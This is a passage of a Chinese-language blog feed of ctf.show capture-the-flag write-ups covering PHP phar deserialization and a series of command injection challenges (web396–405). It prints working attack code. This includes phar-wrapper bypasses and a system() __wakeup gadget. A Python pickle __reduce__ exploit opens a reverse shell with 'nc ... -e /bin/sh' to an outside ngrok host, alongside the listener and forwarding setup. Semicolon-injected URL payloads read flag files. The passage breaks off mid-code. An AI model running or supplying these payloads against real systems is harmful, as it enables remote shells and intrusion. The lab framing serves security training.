invoke__">open</span>(<span class="string">&#x27;c.zip&#x27;</span>);</span><br><span class="line"><span class="variable">$zip</span>-&gt;<span class="title function_ invoke__">extractTo</span>(<span class="string">&#x27;phar://test.phar/test&#x27;</span>);</span><br><span class="line"><span class="comment">// Bzip / Gzip 当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://绕过</span></span><br><span class="line"><span class="variable">$z</span> = <span class="string">&#x27;compress.bzip2://phar:///home/sx/test.phar/test.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$z</span> = <span class="string">&#x27;compress.zlib://phar:///home/sx/test.phar/test.txt&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//配合其他协议：(SUCTF)</span></span><br><span class="line"><span class="comment">//https://www.xctf.org.cn/library/details/17e9b70557d94b168c3e5d1e7d4ce78f475de26d/</span></span><br><span class="line"><span class="comment">//当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。</span></span><br><span class="line"><span class="comment">//php://filter/read=convert.base64-encode/resource=phar://phar.phar</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Postgres pgsqlCopyToFile和pg_trace同样也是能使用的，需要开启phar的写功能。</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pdo</span> = <span class="keyword">new</span> <span class="title class_">PDO</span>(<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;pgsql:host=%s;dbname=%s;user=%s;password=%s&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;postgres&quot;</span>, <span class="string">&quot;sx&quot;</span>, <span class="string">&quot;123456&quot;</span>));</span><br><span class="line">@<span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">pgsqlCopyFromFile</span>(<span class="string">&#x27;aa&#x27;</span>, <span class="string">&#x27;phar://phar.phar/aa&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// Mysql</span></span><br><span class="line"><span class="comment">//LOAD DATA LOCAL INFILE也会触发这个php_stream_open_wrapper</span></span><br><span class="line"><span class="comment">//配置一下mysqld:</span></span><br><span class="line"><span class="comment">//[mysqld]</span></span><br><span class="line"><span class="comment">//local-infile=1</span></span><br><span class="line"><span class="comment">//secure_file_priv=&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable language_">$this</span>-&gt;s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$m</span> = <span class="title function_ invoke__">mysqli_init</span>();</span><br><span class="line"><span class="title function_ invoke__">mysqli_options</span>(<span class="variable">$m</span>, MYSQLI_OPT_LOCAL_INFILE, <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">mysqli_real_connect</span>(<span class="variable">$m</span>, <span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;testtable&#x27;</span>, <span class="number">3306</span>);</span><br><span class="line"><span class="variable">$p</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$m</span>, <span class="string">&#x27;LOAD DATA LOCAL INFILE \&#x27;phar://test.phar/test\&#x27; INTO TABLE a  LINES TERMINATED BY \&#x27;\r\n\&#x27;  IGNORE 1 LINES;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2:&#x2F;&#x2F;和compress.zlib:&#x2F;&#x2F;等绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">compress.bzip://phar:///test.phar/test.txt</span><br><span class="line">compress.bzip2://phar:///test.phar/test.txt</span><br><span class="line">compress.zlib://phar:///home/sx/test.phar/test.txt</span><br><span class="line">php://filter/resource=phar:///test.phar/test.txt</span><br></pre></td></tr></table></figure><p>当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。<br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;phar:&#x2F;&#x2F;phar.phar</p><p>GIF格式验证可以通过在文件头部添加GIF89a绕过<br>1、$phar-&gt;setStub(“GIF89a”.“<?php __HALT_COMPILER(); ?>”); &#x2F;&#x2F;设置stub<br>2、生成一个phar.phar，修改后缀名为phar.gif</p><h1 id="web277-278"><a href="#web277-278" class="headerlink" title="web277-278"></a>web277-278</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406203410604.png" alt="image-20220406203410604"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span>(<span class="title">object</span>):</span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">__reduce__</span>(<span class="title">self</span>):</span></span><br><span class="line"><span class="class">        <span class="title">return</span> (<span class="title">os</span>.<span class="title">popen</span>,(&#x27;<span class="title">nc</span> 2.<span class="title">tcp</span>.<span class="title">ngrok</span>.<span class="title">io</span> 16400  -<span class="title">e</span> /<span class="title">bin</span>/<span class="title">sh</span>&#x27;,))</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">a</span>=<span class="title">exp</span>()</span></span><br><span class="line"><span class="class"><span class="title">s</span>=<span class="title">pickle</span>.<span class="title">dumps</span>(<span class="title">a</span>)</span></span><br><span class="line"><span class="class"><span class="title">url</span>=&quot;<span class="title">http</span>://8<span class="title">df544be</span>-<span class="title">de90</span>-458<span class="title">a</span>-<span class="title">ac48</span>-26<span class="title">e622963733</span>.<span class="title">challenge</span>.<span class="title">ctf</span>.<span class="title">show</span>/<span class="title">backdoor</span>&quot;</span></span><br><span class="line"><span class="class"><span class="title">params</span>=</span>&#123;</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>:base64.<span class="title function_ invoke__">b64encode</span>(s)</span><br><span class="line">&#125;</span><br><span class="line">r=requests.<span class="title function_ invoke__">get</span>(url=url,params=params)</span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406210434118.png" alt="image-20220406210434118"></p><p>这个好像用过一次就要重开一个</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406211354162.png" alt="image-20220406211354162"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406211501481.png" alt="image-20220406211501481"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406211450199.png" alt="image-20220406211450199"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406211348918.png" alt="image-20220406211348918"></p><h2 id="nc-反弹bash"><a href="#nc-反弹bash" class="headerlink" title="nc 反弹bash"></a>nc 反弹bash</h2><p>首先攻击端开两个窗口一个用来反弹bash,另一个用来转发流量</p><p>监听本地8888端口,kali的ip是152</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp 8888</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406210021622.png" alt="image-20220406210021622"></p><p>转发tcp流量,转发到kali的888端口上面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ngrok tcp 192.168.5.152:8888</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406210138853.png" alt="image-20220406210138853"></p><p>被攻击端的语法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -vv 6.tcp.ngrok.io 16893  -e /bin/sh</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406210305935.png" alt="image-20220406210305935"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406210327480.png" alt="image-20220406210327480"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>其他</title>
      <link href="/ctfshow/ctf.show/%E5%85%B6%E4%BB%96/"/>
      <url>/ctfshow/ctf.show/%E5%85%B6%E4%BB%96/</url>
      
        <content type="html"><![CDATA[<h1 id="web396"><a href="#web396" class="headerlink" title="web396"></a>web396</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-15 17:20:22</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);<span class="comment">#解析一个url返回关联数组</span></span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);<span class="comment">#通过shell环境执行命令,并将完整的输出以字符串形式返回 host www.baidu.com path /test/</span></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>简单测试一下发现,通过;可以让shell的命令进行分开执行</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291943011.png" alt="image-20220329194307970"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://1/1; echo `ls` &gt; 1.txt</span><br></pre></td></tr></table></figure><p>接着访问1.txt文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291945703.png" alt="image-20220329194559670"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://www/qqq;cat fl0g.php &gt; 2.txt</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291953344.png" alt="image-20220329195341272"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://www/qqq;tac `ls`&gt; 3.txt</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203291953960.png" alt="image-20220329195357904"></p><h1 id="web397"><a href="#web397" class="headerlink" title="web397"></a>web397</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-15 17:49:13</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; /tmp/&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>有一个&#x2F;tmp&#x2F;目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://1/1; echo `ls`/../ &gt; 1.txt</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312033319.png" alt="image-20220331203325243"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312033697.png" alt="image-20220331203335633"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://www/qqq;cat fl0g.php &gt; 2.txt</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312035864.png" alt="image-20220331203522793"></p><h1 id="web398"><a href="#web398" class="headerlink" title="web398"></a>web398</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-15 18:00:42</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/;/&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; /tmp/&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=http:<span class="comment">//1/1;echo `ls`&gt;a.txt</span></span><br><span class="line">?url=http:<span class="comment">//1/1;echo `cat fl0g.php`&gt;a.txt</span></span><br></pre></td></tr></table></figure><h1 id="web399"><a href="#web399" class="headerlink" title="web399"></a>web399</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-15 18:04:27</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/;|&gt;/&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; /tmp/&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=http:<span class="comment">//1/1;echo `ls`&gt;a.txt</span></span><br><span class="line">?url=http:<span class="comment">//1/1;echo `cat fl0g.php`&gt;a.txt</span></span><br></pre></td></tr></table></figure><h1 id="web400"><a href="#web400" class="headerlink" title="web400"></a>web400</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-15 18:13:14</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/;|&gt;|http|https/i&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; /tmp/&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=http:<span class="comment">//1/1;echo `ls`&gt;a.txt</span></span><br><span class="line">?url=http:<span class="comment">//1/1;echo `cat fl0g.php`&gt;a.txt</span></span><br></pre></td></tr></table></figure><h1 id="web401"><a href="#web401" class="headerlink" title="web401"></a>web401</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-15 18:16:48</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/;|&gt;|http|https|\|/i&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; /tmp/&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=http:<span class="comment">//1/1;echo `ls`&gt;a.txt</span></span><br><span class="line">?url=http:<span class="comment">//1/1;echo `cat fl0g.php`&gt;a.txt</span></span><br></pre></td></tr></table></figure><h1 id="web402"><a href="#web402" class="headerlink" title="web402"></a>web402</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-15 18:35:41</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/;|&gt;|\||base/i&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; /tmp/&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=file:<span class="comment">//1/1;echo `ls`&gt;a.txt</span></span><br><span class="line">?url=file:<span class="comment">//1/1;echo `cat fl0g.php`&gt;a.txt</span></span><br></pre></td></tr></table></figure><h1 id="web403"><a href="#web403" class="headerlink" title="web403"></a>web403</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-15 18:44:06</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)$/&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;curl &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=http:<span class="comment">//127.0.0.1/1;echo `cat fl0g.php`&gt;a.txt</span></span><br></pre></td></tr></table></figure><h1 id="405"><a href="#405" class="headerlink" title="405"></a>405</h1><h1 id="web405"><a href="#web405" class="headerlink" title="web405"></a>web405</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-15 16:38:07</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-15 19:20:10</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span 